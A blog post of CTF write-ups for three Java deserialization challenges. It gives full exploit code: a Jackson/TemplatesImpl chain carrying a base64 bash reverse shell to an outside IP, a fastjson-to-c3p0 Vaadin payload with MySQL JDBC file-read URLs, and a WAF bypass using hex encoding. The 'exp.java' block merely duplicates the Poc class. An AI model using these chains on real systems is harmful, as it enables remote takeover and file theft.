# Java-CTF(1)

  
  
&lt;!--more--&gt;  
# 2024阿里云CTF Bypassit1  
`docker run -it -d -p 12345:8080 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} lxxxin/aliyunctf2023_bypassit1`  
## 0x01 解题记录  
只有一个控制器`bypassit`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151455706.png)
直接反序列化，看一下依赖  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151455264.png)
很明显是打 jackson 直接调用`getter`方法，但是过滤了`TemplatesImpl`，无法直接调用  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151456419.png)
这里需要用到`POJONode#toString`来调用到`getter`方法，从而触发到`TemplatesImpl`中的`getter`方法  
来看一下原理`POJONode`继承于抽象类`BaseJsonNode`，而`BaseJsonNode`存在于`toString`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151520907.png)
跟进`nodeToString`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151520526.png)
`writeValueAsString()`方法正是`Jackson`中的，可以调用`getter`方法  
那问题来了？如何调用到`toString`方法呢？这里利用 CC5 的部分链  
`BadAttributeValueExpException`中`readObject`中可以调用任意类`toString`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151525612.png)
直接构造`exp`  
```java  
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;    
import javassist.CannotCompileException;    
import javassist.ClassPool;    
import javassist.CtClass;    
import javassist.NotFoundException;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.util.Base64;    
import java.util.UUID;    
    
    
public class Poc {    
    public static byte[] getTemplates () throws CannotCompileException, IOException, NotFoundException {    
        ClassPool classPool = ClassPool.getDefault();    
        // 生成一个随机的类名    
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);    
        CtClass ctClass = classPool.makeClass(randomClassName);    
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));    
        String block = &#34;Runtime.getRuntime().exec(\&#34;bash -c {echo,YmFzaCAtaSA&#43;JiAvZGV2L3RjcC8xMC4yMTYuNy43OS8xMjM0IDA&#43;JjE=}|{base64,-d}|{bash,-i}\&#34;);&#34;;    
        ctClass.makeClassInitializer().insertBefore(block);    
        return ctClass.toBytecode();    
    }    
    
    public static void main(String[] args) throws Exception{    
        byte[] code = getTemplates();    
        byte[][] codes = {code};    
        // TemplatesImpl    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;useless&#34;);    
        setFieldValue(templates, &#34;_tfactory&#34;,  null);    
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);    
    
        POJONode node = new POJONode(templates);    
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);    
        setFieldValue(val,&#34;val&#34;,node);    
        System.out.println(serialize(val));    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411151602529.png)
# 2021东华杯-ezgadget  
## 0x01 解题记录  
`java -jar ezgadget.jar`  
存在反序列化入口  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162157902.png)
存在条件  
`name.equals(&#34;gadgets&#34;) &amp;&amp; year == 2021`  
在`ToStringBean`类下存在`toString`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162159484.png)
这里可以加载任意类，利用`BadAttributeValueExpException`类触发`toString`方法  
构造 exp  
```java  
import com.ezgame.ctf.tools.ToStringBean;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.Base64;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        byte[] bytes = Files.readAllBytes(Paths.get(&#34;/Users/f10wers13eicheng/Desktop/Java/ezgadgetexp/src/main/java/exp.class&#34;));    
        ToStringBean toStringBean = new ToStringBean();    
        setFieldValue(toStringBean,&#34;ClassByte&#34;,bytes);    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);    
        setFieldValue(badAttributeValueExpException,&#34;val&#34;,toStringBean);    
        System.out.println(serialize(badAttributeValueExpException));    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeUTF(&#34;gadgets&#34;);    
        objectOutputStream.writeInt(2021);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
}  
```  
exp.java  
```java  
import com.ezgame.ctf.tools.ToStringBean;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import java.nio.file.Files;    
import java.nio.file.Paths;    
import java.util.Base64;    
    
public class Poc {    
    public static void main(String[] args) throws Exception{    
        byte[] bytes = Files.readAllBytes(Paths.get(&#34;/Users/f10wers13eicheng/Desktop/Java/ezgadgetexp/src/main/java/exp.class&#34;));    
        ToStringBean toStringBean = new ToStringBean();    
        setFieldValue(toStringBean,&#34;ClassByte&#34;,bytes);    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);    
        setFieldValue(badAttributeValueExpException,&#34;val&#34;,toStringBean);    
        System.out.println(serialize(badAttributeValueExpException));    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeUTF(&#34;gadgets&#34;);    
        objectOutputStream.writeInt(2021);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411162232060.png)
# 2023闽盾杯初赛 babyja  
```bash  
docker run -it -d -p 12345:8080 -e FLAG=flag{8382843b-d3e8-72fc-6625-ba5269953b23} lxxxin/mdb2023_babyja  
```  
## 0x01 解题记录  
`pom.xml`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171437315.png)
这几个依赖均存在漏洞，看一下控制器  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171438167.png)
`JSON.parse`解析了传入的`data`，存在`fastjson`解析漏洞  
同时也进行了 waf  
```java  
private void checkForBlockedClasses() {    
    Pattern pattern = Pattern.compile(&#34;(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)&#34;);    
    if (pattern.matcher(this.input).find()) {    
        throw new SecurityException(&#34;hacker&#34;);    
    }    
}  
```  
过滤了`TemplaesImpl`、`JdbcRowSetImpl`等常用的 sink 点  
不过题目还是提供了`MyBean`类`getConnection()`方法可以进行利用  
这里直接利用`fastjson1.2.47`打`c3p0`二次反序列化  
二次反序列化的内容是`Vaadin1`依赖触发`getConnection`  
触发点仍是`BadAttributeValueExpException`，因为题目中虽然过滤了`BadAttributeValueExpException`但是并未过滤其十六进制  
POP Chains:  
`BadAttributeValueExpException#readObject#-&gt;Vaadin1#getter-&gt;MyBean#getConnection()`  
```java  
import com.ctf.bean.MyBean;    
    
import javax.management.BadAttributeValueExpException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.io.StringWriter;    
import java.lang.reflect.Field;    
import com.vaadin.data.util.NestedMethodProperty;    
import com.vaadin.data.util.PropertysetItem;    
    
public class Poc {    
    
    public static void main(String[] args) throws Exception {    
        MyBean myBean = new MyBean();    
        myBean.setDatabase(&#34;mysql://127.0.0.1:3306/test?user=fileread_file:///.&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#&#34;);    
        NestedMethodProperty&lt;Object&gt; nestedMethodProperty = new NestedMethodProperty(myBean,&#34;Connection&#34;);    
        PropertysetItem propertysetItem = new PropertysetItem();    
        propertysetItem.addItemProperty(&#34;Connection&#34;, nestedMethodProperty);    
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);    
        setFieldValue(badAttributeValueExpException,&#34;val&#34;,propertysetItem);    
        System.out.println(toHexAscii(tobyteArray(badAttributeValueExpException)));    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
    //将类序列化为字节数组    
    public static byte[] tobyteArray(Object o) throws IOException {    
        ByteArrayOutputStream bao = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(bao);    
        oos.writeObject(o);    
        return bao.toByteArray();    
    }    
    static void addHexAscii(byte b, StringWriter sw)    
    {    
        int ub = b &amp; 0xff;    
        int h1 = ub / 16;    
        int h2 = ub % 16;    
        sw.write(toHexDigit(h1));    
        sw.write(toHexDigit(h2));    
    }    
    
    private static char toHexDigit(int h)    
    {    
        char out;    
        if (h &lt;= 9) out = (char) (h &#43; 0x30);    
        else out = (char) (h &#43; 0x37);    
        //System.err.println(h &#43; &#34;: &#34; &#43; out);    
        return out;    
    }    
    //字节数组转十六进制    
    public static String toHexAscii(byte[] bytes)    
    {    
        int len = bytes.length;    
        StringWriter sw = new StringWriter(len * 2);    
        for (int i = 0; i &lt; len; &#43;&#43;i)    
            addHexAscii(bytes[i], sw);    
        return sw.toString();    
    }    
}  
```  
  
```json  
{  
  &#34;a&#34;: {  
    &#34;@type&#34;: &#34;java.lang.Class&#34;,  
    &#34;val&#34;: &#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;  
  },  
  &#34;b&#34;: {  
    &#34;@type&#34;: &#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;,  
    &#34;userOverridesAsString&#34;: &#34;HexAsciiSerializedMap:&lt;result&gt;;&#34;,  
  }  
}  
```  
列举目录  
```java  
mysql://127.0.0.1:3306/test?user=fileread_file:///.&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171522126.png)
读取文件  
```java  
mysql://127.0.0.1:3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411171523344.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java-ctf1/  

